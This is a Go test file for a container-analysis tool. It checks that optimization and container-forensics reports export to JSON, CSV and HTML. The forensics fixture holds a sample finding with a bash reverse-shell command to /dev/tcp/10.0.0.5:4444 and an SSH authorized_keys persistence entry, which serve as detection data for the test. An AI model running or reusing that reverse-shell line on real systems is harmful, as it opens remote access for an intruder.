package report

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/kristinb/bonestack/internal/layers"
)

func TestExportOptimizationReportWritesAllFormats(t *testing.T) {
	tmpDir := t.TempDir()

	report := layers.OptimizationReport{
		EstimatedSavings: 1234,
		LayerCount:       2,
		BloatItemCount:   1,
		Recommendations:  []string{"Use a slimmer base image"},
	}
	imageLayers := &layers.ImageLayers{
		Layers: []layers.Layer{
			{Size: 2048, Command: "RUN apt-get install curl"},
			{Size: 4096, Command: "RUN npm install"},
		},
	}
	bloat := map[int][]layers.BloatItem{
		1: {{Pattern: "npm_cache", Description: "cache", EstimatedSize: 10}},
	}
	analyses := []layers.FileAnalysisResult{
		{PotentialBloat: []layers.BloatFinding{{Path: "/var/cache/apt/pkg", Type: "cache", Severity: "high", Size: 8192, Removable: true}}},
	}

	exportDir, err := ExportOptimizationReport(tmpDir, "example:latest", report, imageLayers, bloat, analyses)
	if err != nil {
		t.Fatalf("ExportOptimizationReport failed: %v", err)
	}

	wantFiles := []string{
		filepath.Join(exportDir, "optimization.json"),
		filepath.Join(exportDir, "optimization.csv"),
		filepath.Join(exportDir, "optimization.html"),
	}
	for _, file := range wantFiles {
		if _, err := os.Stat(file); err != nil {
			t.Fatalf("expected file %s: %v", file, err)
		}
	}

	htmlData, err := os.ReadFile(filepath.Join(exportDir, "optimization.html"))
	if err != nil {
		t.Fatalf("read html: %v", err)
	}
	if !strings.Contains(string(htmlData), "Use a slimmer base image") {
		t.Fatalf("html report missing recommendation: %s", string(htmlData))
	}
}

func TestExportContainerForensicsReportWritesAllFormats(t *testing.T) {
	tmpDir := t.TempDir()

	exportDir, err := ExportContainerForensicsReport(
		tmpDir,
		"attacker-lab1",
		[]map[string]string{
			{"category": "reverse-shell", "path": "/tmp/revshell.sh", "severity": "critical", "detail": "bash -i >& /dev/tcp/10.0.0.5/4444"},
		},
		map[string]int{"reverse-shell": 1},
		[]map[string]string{
			{"kind": "added", "path": "/root/.ssh/authorized_keys", "suspicious": "true", "detail": "SSH persistence candidate"},
		},
		map[string]int{"added": 1, "suspicious": 1},
		[]map[string]string{
			{"time": "2026-04-02T10:00:00Z", "action": "start", "type": "container", "actor": "attacker-lab1", "details": "image=attacker-lab:latest"},
		},
		map[string]int{"start": 1},
	)
	if err != nil {
		t.Fatalf("ExportContainerForensicsReport failed: %v", err)
	}

	wantFiles := []string{
		filepath.Join(exportDir, "forensics.json"),
		filepath.Join(exportDir, "forensics.csv"),
		filepath.Join(exportDir, "forensics.html"),
	}
	for _, file := range wantFiles {
		if _, err := os.Stat(file); err != nil {
			t.Fatalf("expected file %s: %v", file, err)
		}
	}

	htmlData, err := os.ReadFile(filepath.Join(exportDir, "forensics.html"))
	if err != nil {
		t.Fatalf("read html: %v", err)
	}
	if !strings.Contains(string(htmlData), "reverse-shell") || !strings.Contains(string(htmlData), "authorized_keys") || !strings.Contains(string(htmlData), "2026-04-02T10:00:00Z") {
		t.Fatalf("html forensics report missing content: %s", string(htmlData))
	}
}
